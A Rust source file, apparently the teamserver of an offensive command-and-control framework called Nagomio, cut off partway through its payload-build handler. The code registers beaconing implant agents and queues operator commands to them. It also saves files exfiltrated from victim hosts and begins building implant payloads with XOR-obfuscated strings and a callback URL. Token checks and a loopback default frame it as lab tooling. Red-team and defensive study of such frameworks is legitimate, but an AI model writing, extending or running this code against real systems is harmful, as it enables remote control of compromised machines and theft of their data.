use axum::{
    extract::{Json, Path as AxumPath, Query, State},
    http::{
        header::{AUTHORIZATION, CONTENT_TYPE},
        HeaderMap, HeaderValue, Method, StatusCode,
    },
    routing::{delete, get, post},
    Router,
};
use base64::Engine;
use rusqlite::{params, Connection};
use shared::{
    AgentRecord, AgentResponse, AgentStatus, AgentSummary, BeaconReply, BeaconRequest,
    PayloadArtifact, PayloadBuildRequest, PayloadConfig, Task, TaskRecord, TaskStatus,
};
use std::cmp::Reverse;
use std::collections::{HashMap, VecDeque};
use std::env;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::{SystemTime, UNIX_EPOCH};
use tokio::net::TcpListener;
use tokio::process::Command;
use tokio::sync::Mutex;
use tower_http::cors::{AllowOrigin, CorsLayer};

const MAX_DOWNLOAD_BYTES: u64 = 10 * 1024 * 1024;
const MAX_UPLOAD_BASE64_BYTES: usize = (MAX_DOWNLOAD_BYTES as usize).div_ceil(3) * 4;
const LOG_PREVIEW_BYTES: usize = 4096;

#[derive(Clone)]
struct AppState {
    store: Store,
    config: Config,
    db_path: Option<PathBuf>,
    state_file: Option<PathBuf>,
}

#[derive(Clone, Default, serde::Deserialize, serde::Serialize)]
struct Store {
    #[serde(default)]
    agents: HashMap<String, AgentRecord>,
    #[serde(default)]
    tasks: HashMap<String, TaskRecord>,
    #[serde(default)]
    pending_tasks: HashMap<String, VecDeque<String>>,
    #[serde(default)]
    responses: HashMap<String, Vec<AgentResponse>>,
    #[serde(default)]
    payloads: HashMap<String, PayloadArtifact>,
}

type SharedState = Arc<Mutex<AppState>>;

#[tokio::main]
async fn main() {
    println!("Nagomio C2 Teamserver starting...");

    let config = Config::from_env();
    if let Err(err) = config.validate_security() {
        eprintln!("[-] {}", err);
        std::process::exit(1);
    }
    if config.api_token.is_none() && config.allow_unauthenticated {
        eprintln!("[-] NAGOMIO_API_TOKEN is not set; operator API requests are unauthenticated.");
    }
    if config.agent_token.is_none() && config.allow_unauthenticated {
        eprintln!("[-] NAGOMIO_AGENT_TOKEN is not set; agent check-ins are unauthenticated.");
    }
    let store = if let Some(path) = &config.db_path {
        load_store_from_db(path).unwrap_or_else(|err| {
            eprintln!(
                "[-] Could not load database {}: {}. Starting with empty state.",
                path.display(),
                err
            );
            Store::default()
        })
    } else {
        match &config.state_file {
            Some(path) => load_store(path).await.unwrap_or_else(|err| {
                eprintln!(
                    "[-] Could not load state file {}: {}. Starting with empty state.",
                    path.display(),
                    err
                );
                Store::default()
            }),
            None => Store::default(),
        }
    };

    if let Some(path) = &config.db_path {
        if let Err(err) = save_store_to_db(path, &store) {
            eprintln!(
                "[-] Could not initialize database {}: {}.",
                path.display(),
                err
            );
        }
    }

    let state = Arc::new(Mutex::new(AppState {
        store,
        config: config.clone(),
        db_path: config.db_path.clone(),
        state_file: config.state_file.clone(),
    }));

    let app = Router::new()
        .route("/health", get(|| async { "OK" }))
        .route("/beacon", post(handle_beacon))
        .route("/response", post(handle_response))
        .route("/api/agents", get(api_get_agents))
        .route(
            "/api/agents/:agent_id",
            get(api_get_agent).delete(api_delete_agent),
        )
        .route("/api/tasks", get(api_get_tasks).post(api_add_task))
        .route("/api/tasks/:task_id", get(api_get_task))
        .route("/api/tasks/:task_id/responses", get(api_get_task_responses))
        .route("/api/responses", get(api_get_responses))
        .route("/api/payload/config", get(api_payload_config))
        .route("/api/payload/build", post(api_build_payload))
        .route("/api/payload/artifacts", get(api_get_payload_artifacts))
        .route(
            "/api/payload/artifacts",
            delete(api_delete_payload_artifacts),
        )
        .route(
            "/api/payload/artifacts/:build_id",
            get(api_get_payload_artifact),
        )
        .with_state(state)
        .layer(cors_layer(&config));

    let listener = TcpListener::bind(&config.bind_addr).await.unwrap();
    println!("Teamserver listening on {}", listener.local_addr().unwrap());

    axum::serve(listener, app).await.unwrap();
}

#[derive(Clone)]
struct Config {
    bind_addr: String,
    db_path: Option<PathBuf>,
    state_file: Option<PathBuf>,
    project_root: PathBuf,
    payload_dir: PathBuf,
    download_dir: PathBuf,
    callback_url: String,
    default_sleep_seconds: u64,
    api_token: Option<String>,
    agent_token: Option<String>,
    cors_origins: Vec<HeaderValue>,
    allow_unauthenticated: bool,
}

impl Config {
    fn from_env() -> Self {
        let bind_addr =
            env::var("NAGOMIO_BIND_ADDR").unwrap_or_else(|_| "127.0.0.1:8080".to_owned());
        let db_path = env::var_os("NAGOMIO_DB_PATH")
            .map(PathBuf::from)
            .or_else(|| Some(PathBuf::from("nagomio.db")));
        let state_file = env::var_os("NAGOMIO_STATE_FILE").map(PathBuf::from);
        let project_root = env::var_os("NAGOMIO_PROJECT_ROOT")
            .map(PathBuf::from)
            .or_else(|| env::current_dir().ok())
            .unwrap_or_else(|| PathBuf::from("."));
        let payload_dir = env::var_os("NAGOMIO_PAYLOAD_DIR")
            .map(PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("payloads"));
        let download_dir = env::var_os("NAGOMIO_DOWNLOAD_DIR")
            .map(PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("downloads"));
        let callback_url =
            env::var("NAGOMIO_CALLBACK_URL").unwrap_or_else(|_| "http://127.0.0.1:8080".to_owned());
        let default_sleep_seconds = env::var("NAGOMIO_DEFAULT_SLEEP_SECONDS")
            .ok()
            .and_then(|value| value.parse().ok())
            .filter(|value| *value > 0)
            .unwrap_or(5);
        let api_token = env::var("NAGOMIO_API_TOKEN")
            .ok()
            .filter(|value| !value.trim().is_empty());
        let agent_token = env::var("NAGOMIO_AGENT_TOKEN")
            .ok()
            .filter(|value| !value.trim().is_empty());
        let cors_origins = env::var("NAGOMIO_CORS_ORIGINS")
            .ok()
            .map(|value| parse_cors_origins(&value))
            .filter(|origins| !origins.is_empty())
            .unwrap_or_else(default_cors_origins);
        let allow_unauthenticated = env::var("NAGOMIO_ALLOW_UNAUTHENTICATED")
            .ok()
            .and_then(|value| parse_bool(&value))
            .unwrap_or_else(|| is_loopback_bind_addr(&bind_addr));

        Self {
            bind_addr,
            db_path,
            state_file,
            project_root,
            payload_dir,
            download_dir,
            callback_url,
            default_sleep_seconds,
            api_token,
            agent_token,
            cors_origins,
            allow_unauthenticated,
        }
    }

    fn validate_security(&self) -> Result<(), String> {
        if self.allow_unauthenticated {
            return Ok(());
        }

        if self.api_token.is_none() || self.agent_token.is_none() {
            return Err(
                "refusing unauthenticated non-local server; set NAGOMIO_API_TOKEN and NAGOMIO_AGENT_TOKEN, or set NAGOMIO_ALLOW_UNAUTHENTICATED=true for an explicit lab override"
                    .to_owned(),
            );
        }

        Ok(())
    }
}

fn parse_bool(value: &str) -> Option<bool> {
    match value.trim().to_ascii_lowercase().as_str() {
        "1" | "true" | "yes" | "on" => Some(true),
        "0" | "false" | "no" | "off" => Some(false),
        _ => None,
    }
}

fn is_loopback_bind_addr(bind_addr: &str) -> bool {
    let host = bind_addr
        .rsplit_once(':')
        .map(|(host, _)| host.trim_matches(['[', ']']))
        .unwrap_or(bind_addr)
        .trim();

    matches!(host, "127.0.0.1" | "localhost" | "::1")
}

fn default_cors_origins() -> Vec<HeaderValue> {
    [
        "tauri://localhost",
        "http://127.0.0.1:1420",
        "http://localhost:1420",
        "http://127.0.0.1:8080",
        "http://localhost:8080",
    ]
    .into_iter()
    .map(HeaderValue::from_static)
    .collect()
}

fn parse_cors_origins(value: &str) -> Vec<HeaderValue> {
    let origins = value
        .split(',')
        .filter_map(|item| {
            let trimmed = item.trim();
            if trimmed.is_empty() {
                return None;
            }

            match HeaderValue::from_str(trimmed) {
                Ok(origin) => Some(origin),
                Err(err) => {
                    eprintln!("[-] Ignoring invalid CORS origin {}: {}", trimmed, err);
                    None
                }
            }
        })
        .collect::<Vec<_>>();

    if origins.is_empty() {
        default_cors_origins()
    } else {
        origins
    }
}

fn cors_layer(config: &Config) -> CorsLayer {
    CorsLayer::new()
        .allow_origin(AllowOrigin::list(config.cors_origins.clone()))
        .allow_headers([AUTHORIZATION, CONTENT_TYPE])
        .allow_methods([Method::GET, Method::POST, Method::DELETE, Method::OPTIONS])
}

fn open_db(path: &Path) -> rusqlite::Result<Connection> {
    if let Some(parent) = path
        .parent()
        .filter(|parent| !parent.as_os_str().is_empty())
    {
        std::fs::create_dir_all(parent)
            .map_err(|err| rusqlite::Error::ToSqlConversionFailure(Box::new(err)))?;
    }

    let conn = Connection::open(path)?;
    conn.execute_batch(
        "
        PRAGMA foreign_keys = ON;
        CREATE TABLE IF NOT EXISTS agents (
            agent_id TEXT PRIMARY KEY,
            registration_json TEXT NOT NULL,
            first_seen_unix INTEGER NOT NULL,
            last_seen_unix INTEGER NOT NULL
        );
        CREATE TABLE IF NOT EXISTS tasks (
            task_id TEXT PRIMARY KEY,
            agent_id TEXT NOT NULL,
            command TEXT NOT NULL,
            arguments_json TEXT NOT NULL,
            status TEXT NOT NULL,
            created_at_unix INTEGER NOT NULL,
            dispatched_at_unix INTEGER,
            completed_at_unix INTEGER
        );
        CREATE TABLE IF NOT EXISTS pending_tasks (
            agent_id TEXT NOT NULL,
            position INTEGER NOT NULL,
            task_id TEXT NOT NULL,
            PRIMARY KEY (agent_id, position)
        );
        CREATE TABLE IF NOT EXISTS responses (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT NOT NULL,
            task_id TEXT,
            output TEXT NOT NULL,
            status TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS payloads (
            build_id TEXT PRIMARY KEY,
            artifact_json TEXT NOT NULL
        );
        ",
    )?;
    Ok(conn)
}

fn load_store_from_db(path: &Path) -> Result<Store, Box<dyn std::error::Error + Send + Sync>> {
    let conn = open_db(path)?;
    let mut store = Store::default();

    let mut agents = conn.prepare(
        "SELECT agent_id, registration_json, first_seen_unix, last_seen_unix FROM agents",
    )?;
    let agent_rows = agents.query_map([], |row| {
        let agent_id: String = row.get(0)?;
        let registration_json: String = row.get(1)?;
        let registration = serde_json::from_str(&registration_json).map_err(|err| {
            rusqlite::Error::FromSqlConversionFailure(1, rusqlite::types::Type::Text, Box::new(err))
        })?;
        Ok((
            agent_id,
            AgentRecord {
                registration,
                first_seen_unix: row.get::<_, i64>(2)? as u64,
                last_seen_unix: row.get::<_, i64>(3)? as u64,
            },
        ))
    })?;
    for row in agent_rows {
        let (agent_id, agent) = row?;
        store.agents.insert(agent_id, agent);
    }

    let mut tasks = conn.prepare(
        "SELECT task_id, agent_id, command, arguments_json, status, created_at_unix, dispatched_at_unix, completed_at_unix FROM tasks",
    )?;
    let task_rows = tasks.query_map([], |row| {
        let task_id: String = row.get(0)?;
        let arguments_json: String = row.get(3)?;
        let status: String = row.get(4)?;
        let arguments = serde_json::from_str(&arguments_json).map_err(|err| {
            rusqlite::Error::FromSqlConversionFailure(3, rusqlite::types::Type::Text, Box::new(err))
        })?;
        let status = serde_json::from_value(serde_json::Value::String(status)).map_err(|err| {
            rusqlite::Error::FromSqlConversionFailure(4, rusqlite::types::Type::Text, Box::new(err))
        })?;
        Ok((
            task_id.clone(),
            TaskRecord {
                agent_id: row.get(1)?,
                task: Task {
                    task_id,
                    command: row.get(2)?,
                    arguments,
                },
                status,
                created_at_unix: row.get::<_, i64>(5)? as u64,
                dispatched_at_unix: row.get::<_, Option<i64>>(6)?.map(|value| value as u64),
                completed_at_unix: row.get::<_, Option<i64>>(7)?.map(|value| value as u64),
            },
        ))
    })?;
    for row in task_rows {
        let (task_id, task) = row?;
        store.tasks.insert(task_id, task);
    }

    let mut pending = conn.prepare(
        "SELECT agent_id, task_id FROM pending_tasks ORDER BY agent_id ASC, position ASC",
    )?;
    let pending_rows = pending.query_map([], |row| {
        Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))
    })?;
    for row in pending_rows {
        let (agent_id, task_id) = row?;
        store
            .pending_tasks
            .entry(agent_id)
            .or_insert_with(VecDeque::new)
            .push_back(task_id);
    }

    let mut responses =
        conn.prepare("SELECT agent_id, task_id, output, status FROM responses ORDER BY id ASC")?;
    let response_rows = responses.query_map([], |row| {
        Ok(AgentResponse {
            agent_id: row.get(0)?,
            task_id: row.get(1)?,
            output: row.get(2)?,
            status: row.get(3)?,
        })
    })?;
    for row in response_rows {
        let response = row?;
        store
            .responses
            .entry(response.agent_id.clone())
            .or_insert_with(Vec::new)
            .push(response);
    }

    let mut payloads = conn.prepare("SELECT build_id, artifact_json FROM payloads")?;
    let payload_rows = payloads.query_map([], |row| {
        let build_id: String = row.get(0)?;
        let artifact_json: String = row.get(1)?;
        let artifact = serde_json::from_str(&artifact_json).map_err(|err| {
            rusqlite::Error::FromSqlConversionFailure(1, rusqlite::types::Type::Text, Box::new(err))
        })?;
        Ok((build_id, artifact))
    })?;
    for row in payload_rows {
        let (build_id, artifact) = row?;
        store.payloads.insert(build_id, artifact);
    }

    Ok(store)
}

fn save_store_to_db(
    path: &Path,
    store: &Store,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let mut conn = open_db(path)?;
    let tx = conn.transaction()?;
    tx.execute("DELETE FROM agents", [])?;
    tx.execute("DELETE FROM tasks", [])?;
    tx.execute("DELETE FROM pending_tasks", [])?;
    tx.execute("DELETE FROM responses", [])?;
    tx.execute("DELETE FROM payloads", [])?;

    for (agent_id, agent) in &store.agents {
        tx.execute(
            "INSERT INTO agents (agent_id, registration_json, first_seen_unix, last_seen_unix) VALUES (?1, ?2, ?3, ?4)",
            params![
                agent_id,
                serde_json::to_string(&agent.registration)?,
                agent.first_seen_unix as i64,
                agent.last_seen_unix as i64,
            ],
        )?;
    }

    for (task_id, record) in &store.tasks {
        tx.execute(
            "INSERT INTO tasks (task_id, agent_id, command, arguments_json, status, created_at_unix, dispatched_at_unix, completed_at_unix) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
            params![
                task_id,
                record.agent_id,
                record.task.command,
                serde_json::to_string(&record.task.arguments)?,
                serde_json::to_value(&record.status)?.as_str().unwrap_or("queued"),
                record.created_at_unix as i64,
                record.dispatched_at_unix.map(|value| value as i64),
                record.completed_at_unix.map(|value| value as i64),
            ],
        )?;
    }

    for (agent_id, queue) in &store.pending_tasks {
        for (position, task_id) in queue.iter().enumerate() {
            tx.execute(
                "INSERT INTO pending_tasks (agent_id, position, task_id) VALUES (?1, ?2, ?3)",
                params![agent_id, position as i64, task_id],
            )?;
        }
    }

    for responses in store.responses.values() {
        for response in responses {
            tx.execute(
                "INSERT INTO responses (agent_id, task_id, output, status) VALUES (?1, ?2, ?3, ?4)",
                params![
                    response.agent_id,
                    response.task_id,
                    response.output,
                    response.status,
                ],
            )?;
        }
    }

    for (build_id, artifact) in &store.payloads {
        tx.execute(
            "INSERT INTO payloads (build_id, artifact_json) VALUES (?1, ?2)",
            params![build_id, serde_json::to_string(artifact)?],
        )?;
    }

    tx.commit()?;
    Ok(())
}

async fn load_store(path: &Path) -> Result<Store, Box<dyn std::error::Error + Send + Sync>> {
    match tokio::fs::read(path).await {
        Ok(bytes) => Ok(serde_json::from_slice(&bytes)?),
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => Ok(Store::default()),
        Err(err) => Err(Box::new(err)),
    }
}

async fn save_store(path: Option<PathBuf>, store: Store) {
    let Some(path) = path else {
        return;
    };

    if let Some(parent) = path.parent() {
        if let Err(err) = tokio::fs::create_dir_all(parent).await {
            eprintln!(
                "[-] Could not create state directory {}: {}",
                parent.display(),
                err
            );
            return;
        }
    }

    match serde_json::to_vec_pretty(&store) {
        Ok(bytes) => {
            if let Err(err) = tokio::fs::write(&path, bytes).await {
                eprintln!("[-] Could not write state file {}: {}", path.display(), err);
            }
        }
        Err(err) => eprintln!("[-] Could not serialize state: {}", err),
    }
}

async fn persist_store(db_path: Option<PathBuf>, state_file: Option<PathBuf>, store: Store) {
    if let Some(path) = db_path {
        if let Err(err) = save_store_to_db(&path, &store) {
            eprintln!("[-] Could not persist database {}: {}", path.display(), err);
        }
    }

    save_store(state_file, store).await;
}

// Emulate a C2 standard check-in. Agent gives Registration data on every check-in for simplicity v1.
async fn handle_beacon(
    State(state): State<SharedState>,
    headers: HeaderMap,
    Json(payload): Json<BeaconRequest>,
) -> Result<Json<BeaconReply>, (StatusCode, String)> {
    require_agent_auth(&headers, &state).await?;
    let agent_id = payload.registration.agent_id.clone();

    let (task, sleep_seconds, snapshot, db_path, state_file) = {
        let mut state = state.lock().await;
        let now = unix_now();

        state
            .store
            .agents
            .entry(agent_id.clone())
            .and_modify(|agent| {
                agent.registration = payload.registration.clone();
                agent.last_seen_unix = now;
            })
            .or_insert_with(|| AgentRecord {
                registration: payload.registration,
                first_seen_unix: now,
                last_seen_unix: now,
            });

        let task_id = state
            .store
            .pending_tasks
            .get_mut(&agent_id)
            .and_then(VecDeque::pop_front);
        let task = task_id.and_then(|task_id| {
            state.store.tasks.get_mut(&task_id).map(|record| {
                record.status = TaskStatus::Dispatched;
                record.dispatched_at_unix = Some(now);
                record.task.clone()
            })
        });

        (
            task,
            state.config.default_sleep_seconds,
            state.store.clone(),
            state.db_path.clone(),
            state.state_file.clone(),
        )
    };

    persist_store(db_path, state_file, snapshot).await;

    if let Some(task) = &task {
        println!("[*] Tasking agent {}: {}", agent_id, task.command);
    }

    Ok(Json(BeaconReply {
        status: "ok".to_owned(),
        sleep_seconds,
        task,
    }))
}

async fn handle_response(
    State(state): State<SharedState>,
    headers: HeaderMap,
    Json(mut payload): Json<AgentResponse>,
) -> Result<String, (StatusCode, String)> {
    require_agent_auth(&headers, &state).await?;
    println!(
        "[*] Response from {}: {}",
        payload.agent_id,
        log_preview(&payload.output)
    );

    let (snapshot, db_path, state_file) = {
        let mut state = state.lock().await;
        let agent_id = payload.agent_id.clone();
        let now = unix_now();
        if let Some(task_id) = payload.task_id.clone() {
            let task_command = state
                .store
                .tasks
                .get(&task_id)
                .map(|task| task.task.command.clone());
            if task_command.as_deref() == Some("__nagomio_file_download")
                && payload.status == "success"
            {
                if let Err(err) = store_downloaded_file(
                    &state.config.download_dir,
                    &agent_id,
                    &task_id,
                    &mut payload,
                ) {
                    payload.status = "error".to_owned();
                    payload.output = format!("download storage failed: {}", err);
                }
            }

            if let Some(task) = state.store.tasks.get_mut(&task_id) {
                task.completed_at_unix = Some(now);
                task.status = if payload.status == "success" {
                    TaskStatus::Completed
                } else {
                    TaskStatus::Failed
                };
            }
        }
        state
            .store
            .responses
            .entry(agent_id)
            .or_insert_with(Vec::new)
            .push(payload);

        (
            state.store.clone(),
            state.db_path.clone(),
            state.state_file.clone(),
        )
    };

    persist_store(db_path, state_file, snapshot).await;

    Ok("Ack".to_string())
}

fn store_downloaded_file(
    download_dir: &Path,
    agent_id: &str,
    task_id: &str,
    payload: &mut AgentResponse,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    #[derive(serde::Deserialize)]
    struct DownloadPayload {
        path: String,
        filename: String,
        content_base64: String,
        size: u64,
    }

    let download: DownloadPayload = serde_json::from_str(&payload.output)?;
    if download.size > MAX_DOWNLOAD_BYTES {
        return Err(format!(
            "download size {} exceeds {} byte limit",
            download.size, MAX_DOWNLOAD_BYTES
        )
        .into());
    }
    let safe_agent_id = safe_path_segment(agent_id);
    let safe_task_id = safe_path_segment(task_id);
    let safe_filename = safe_path_segment(&download.filename);
    let artifact_dir = download_dir.join(safe_agent_id).join(safe_task_id);
    std::fs::create_dir_all(&artifact_dir)?;
    let artifact_path = artifact_dir.join(safe_filename);
    let bytes = base64::engine::general_purpose::STANDARD.decode(download.content_base64)?;
    if bytes.len() as u64 != download.size {
        return Err("download size metadata did not match decoded content".into());
    }
    std::fs::write(&artifact_path, bytes)?;
    payload.output = serde_json::json!({
        "type": "file_download",
        "remote_path": download.path,
        "saved_path": artifact_path.display().to_string(),
        "size": download.size
    })
    .to_string();
    Ok(())
}

fn log_preview(value: &str) -> String {
    if value.len() <= LOG_PREVIEW_BYTES {
        return value.to_owned();
    }

    let cutoff = value
        .char_indices()
        .map(|(index, _)| index)
        .take_while(|index| *index <= LOG_PREVIEW_BYTES)
        .last()
        .unwrap_or(0);

    format!(
        "{}... [truncated, {} bytes total]",
        &value[..cutoff],
        value.len()
    )
}

fn safe_path_segment(value: &str) -> String {
    let cleaned = value
        .chars()
        .map(|ch| {
            if ch.is_ascii_alphanumeric() || matches!(ch, '.' | '-' | '_') {
                ch
            } else {
                '_'
            }
        })
        .collect::<String>();

    let trimmed = cleaned.trim_matches('.');
    if trimmed.is_empty() {
        "artifact".to_owned()
    } else {
        trimmed.to_owned()
    }
}

fn xor_c_array(value: &str, key: u8) -> String {
    let encoded = value
        .as_bytes()
        .iter()
        .map(|byte| format!("0x{:02x}", byte ^ key))
        .collect::<Vec<_>>()
        .join(",");
    if encoded.is_empty() {
        "0x00".to_owned()
    } else {
        encoded
    }
}

// ----- Tauri Client API Mocks -----
#[derive(serde::Deserialize)]
struct AgentQuery {
    status: Option<AgentStatus>,
}

async fn require_api_auth(
    headers: &HeaderMap,
    state: &SharedState,
) -> Result<(), (StatusCode, String)> {
    let state = state.lock().await;
    let Some(expected) = &state.config.api_token else {
        return if state.config.allow_unauthenticated {
            Ok(())
        } else {
            Err((
                StatusCode::UNAUTHORIZED,
                "API token is not configured".to_owned(),
            ))
        };
    };

    let bearer = headers
        .get(axum::http::header::AUTHORIZATION)
        .and_then(|value| value.to_str().ok())
        .and_then(|value| value.strip_prefix("Bearer "));
    let header_token = headers
        .get("x-nagomio-token")
        .and_then(|value| value.to_str().ok());

    if bearer == Some(expected.as_str()) || header_token == Some(expected.as_str()) {
        Ok(())
    } else {
        Err((
            StatusCode::UNAUTHORIZED,
            "valid API token required".to_owned(),
        ))
    }
}

async fn require_agent_auth(
    headers: &HeaderMap,
    state: &SharedState,
) -> Result<(), (StatusCode, String)> {
    let state = state.lock().await;
    let Some(expected) = &state.config.agent_token else {
        return if state.config.allow_unauthenticated {
            Ok(())
        } else {
            Err((
                StatusCode::UNAUTHORIZED,
                "agent token is not configured".to_owned(),
            ))
        };
    };

    let header_token = headers
        .get("x-nagomio-agent-token")
        .and_then(|value| value.to_str().ok());

    if header_token == Some(expected.as_str()) {
        Ok(())
    } else {
        Err((
            StatusCode::UNAUTHORIZED,
            "valid agent token required".to_owned(),
        ))
    }
}

async fn api_get_agents(
    State(state): State<SharedState>,
    headers: HeaderMap,
    Query(query): Query<AgentQuery>,
) -> Result<Json<Vec<AgentSummary>>, (StatusCode, String)> {
    require_api_auth(&headers, &state).await?;
    let state = state.lock().await;
    let now = unix_now();
    let mut agents = state
        .store
        .agents
        .values()
        .map(|agent| agent_summary(agent, now, state.config.default_sleep_seconds))
        .filter(|agent| {
            query
                .status
                .as_ref()
                .is_none_or(|status| &agent.status == status)
        })
        .collect::<Vec<_>>();
    agents.sort_by_key(|agent| Reverse(agent.last_seen_unix));
    Ok(Json(agents))
}

async fn api_get_agent(
    State(state): State<SharedState>,
    headers: HeaderMap,
    AxumPath(agent_id): AxumPath<String>,
) -> Result<Json<AgentSummary>, (StatusCode, String)> {
    require_api_auth(&headers, &state).await?;
    let state = state.lock().await;
    let agent = state.store.agents.get(&agent_id).ok_or_else(|| {
        (
            StatusCode::NOT_FOUND,
            format!("agent {} not found", agent_id),
        )
    })?;
    Ok(Json(agent_summary(
        agent,
        unix_now(),
        state.config.default_sleep_seconds,
    )))
}

async fn api_delete_agent(
    State(state): State<SharedState>,
    headers: HeaderMap,
    AxumPath(agent_id): AxumPath<String>,
) -> Result<StatusCode, (StatusCode, String)> {
    require_api_auth(&headers, &state).await?;

    let (found, snapshot, db_path, state_file) = {
        let mut state = state.lock().await;
        let found = state.store.agents.remove(&agent_id).is_some();
        state.store.pending_tasks.remove(&agent_id);
        state.store.responses.remove(&agent_id);
        state
            .store
            .tasks
            .retain(|_, task| task.agent_id != agent_id);

        (
            found,
            state.store.clone(),
            state.db_path.clone(),
            state.state_file.clone(),
        )
    };

    if !found {
        return Err((
            StatusCode::NOT_FOUND,
            format!("agent {} not found", agent_id),
        ));
    }

    persist_store(db_path, state_file, snapshot).await;
    Ok(StatusCode::NO_CONTENT)
}

#[derive(serde::Deserialize)]
struct AddTaskReq {
    agent_id: String,
    task: Task,
}

async fn api_add_task(
    State(state): State<SharedState>,
    headers: HeaderMap,
    Json(payload): Json<AddTaskReq>,
) -> Result<Json<TaskRecord>, (StatusCode, String)> {
    require_api_auth(&headers, &state).await?;
    if payload.agent_id.trim().is_empty() {
        return Err((StatusCode::BAD_REQUEST, "agent_id is required".to_owned()));
    }
    if payload.task.task_id.trim().is_empty() {
        return Err((
            StatusCode::BAD_REQUEST,
            "task.task_id is required".to_owned(),
        ));
    }
    if payload.task.command.trim().is_empty() {
        return Err((
            StatusCode::BAD_REQUEST,
            "task.command is required".to_owned(),
        ));
    }
    validate_task_payload(&payload.task)?;

    let (record, snapshot, db_path, state_file) = {
        let mut state = state.lock().await;
        if state.store.tasks.contains_key(&payload.task.task_id) {
            return Err((
                StatusCode::CONFLICT,
                format!("task_id {} already exists", payload.task.task_id),
            ));
        }

        let now = unix_now();
        let record = TaskRecord {
            agent_id: payload.agent_id.clone(),
            task: payload.task.clone(),
            status: TaskStatus::Queued,
            created_at_unix: now,
            dispatched_at_unix: None,
            completed_at_unix: None,
        };

        state
            .store
            .pending_tasks
            .entry(payload.agent_id)
            .or_insert_with(VecDeque::new)
            .push_back(payload.task.task_id.clone());
        state
            .store
            .tasks
            .insert(payload.task.task_id.clone(), record.clone());

        (
            record,
            state.store.clone(),
            state.db_path.clone(),
            state.state_file.clone(),
        )
    };

    persist_store(db_path, state_file, snapshot).await;

    Ok(Json(record))
}

fn validate_task_payload(task: &Task) -> Result<(), (StatusCode, String)> {
    if task.command == "__nagomio_file_upload"
        && task
            .arguments
            .get(1)
            .is_some_and(|content| content.len() > MAX_UPLOAD_BASE64_BYTES)
    {
        return Err((
            StatusCode::PAYLOAD_TOO_LARGE,
            format!(
                "upload content exceeds {} byte decoded file limit",
                MAX_DOWNLOAD_BYTES
            ),
        ));
    }

    Ok(())
}

#[derive(serde::Deserialize)]
struct TaskQuery {
    agent_id: Option<String>,
    status: Option<TaskStatus>,
}

async fn api_get_tasks(
    State(state): State<SharedState>,
    headers: HeaderMap,
    Query(query): Query<TaskQuery>,
) -> Result<Json<Vec<TaskRecord>>, (StatusCode, String)> {
    require_api_auth(&headers, &state).await?;
    let state = state.lock().await;
    let mut tasks = state
        .store
        .tasks
        .values()
        .filter(|task| {
            query
                .agent_id
                .as_ref()
                .is_none_or(|agent_id| &task.agent_id == agent_id)
        })
        .filter(|task| {
            query
                .status
                .as_ref()
                .is_none_or(|status| &task.status == status)
        })
        .cloned()
        .collect::<Vec<_>>();
    tasks.sort_by_key(|task| Reverse(task.created_at_unix));
    Ok(Json(tasks))
}

async fn api_get_task(
    State(state): State<SharedState>,
    headers: HeaderMap,
    AxumPath(task_id): AxumPath<String>,
) -> Result<Json<TaskRecord>, (StatusCode, String)> {
    require_api_auth(&headers, &state).await?;
    let state = state.lock().await;
    let task = state
        .store
        .tasks
        .get(&task_id)
        .cloned()
        .ok_or_else(|| (StatusCode::NOT_FOUND, format!("task {} not found", task_id)))?;
    Ok(Json(task))
}

async fn api_get_task_responses(
    State(state): State<SharedState>,
    headers: HeaderMap,
    AxumPath(task_id): AxumPath<String>,
) -> Result<Json<Vec<AgentResponse>>, (StatusCode, String)> {
    require_api_auth(&headers, &state).await?;
    let state = state.lock().await;
    let responses = state
        .store
        .responses
        .values()
        .flat_map(|responses| responses.iter())
        .filter(|response| response.task_id.as_ref() == Some(&task_id))
        .cloned()
        .collect();
    Ok(Json(responses))
}

#[derive(serde::Deserialize)]
struct ResponseQuery {
    agent_id: Option<String>,
    task_id: Option<String>,
}

async fn api_get_responses(
    State(state): State<SharedState>,
    headers: HeaderMap,
    Query(query): Query<ResponseQuery>,
) -> Result<Json<HashMap<String, Vec<AgentResponse>>>, (StatusCode, String)> {
    require_api_auth(&headers, &state).await?;
    let state = state.lock().await;
    let responses = state
        .store
        .responses
        .iter()
        .filter(|(agent_id, _)| {
            query
                .agent_id
                .as_ref()
                .is_none_or(|filter| *agent_id == filter)
        })
        .filter_map(|(agent_id, responses)| {
            let filtered = responses
                .iter()
                .filter(|response| {
                    query
                        .task_id
                        .as_ref()
                        .is_none_or(|task_id| response.task_id.as_ref() == Some(task_id))
                })
                .cloned()
                .collect::<Vec<_>>();

            if filtered.is_empty() {
                None
            } else {
                Some((agent_id.clone(), filtered))
            }
        })
        .collect();
    Ok(Json(responses))
}

async fn api_payload_config(
    State(state): State<SharedState>,
    headers: HeaderMap,
) -> Result<Json<PayloadConfig>, (StatusCode, String)> {
    require_api_auth(&headers, &state).await?;
    let state = state.lock().await;
    Ok(Json(PayloadConfig {
        callback_url: state.config.callback_url.clone(),
        sleep_seconds: state.config.default_sleep_seconds,
    }))
}

async fn api_build_payload(
    State(state): State<SharedState>,
    headers: HeaderMap,
    Json(payload): Json<PayloadBuildRequest>,
) -> Result<Json<PayloadArtifact>, (StatusCode, String)> {
    require_api_auth(&headers, &state).await?;
    let (config, db_path, state_file) = {
        let state = state.lock().await;
        (
            state.config.clone(),
            state.db_path.clone(),
            state.state_file.clone(),
        )
    };

    let callback_url = payload
        .callback_url
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .unwrap_or_else(|| config.callback_url.trim())
        .to_owned();
    let callback_uses_https = callback_url
        .get(..8)
        .is_some_and(|prefix| prefix.eq_ignore_ascii_case("https://"));
    let sleep_seconds = payload
        .sleep_seconds
        .filter(|value| *value > 0)
        .unwrap_or(config.default_sleep_seconds);
    let jitter_percent = payload.jitter_percent.unwrap_or(0).min(90);
    let created_at_unix = unix_now();
    let build_id = format!("payload-{}-{}", unix_now_nanos(), std::process::id());

    let artifact_dir = config.payload_dir.join(&build_id);
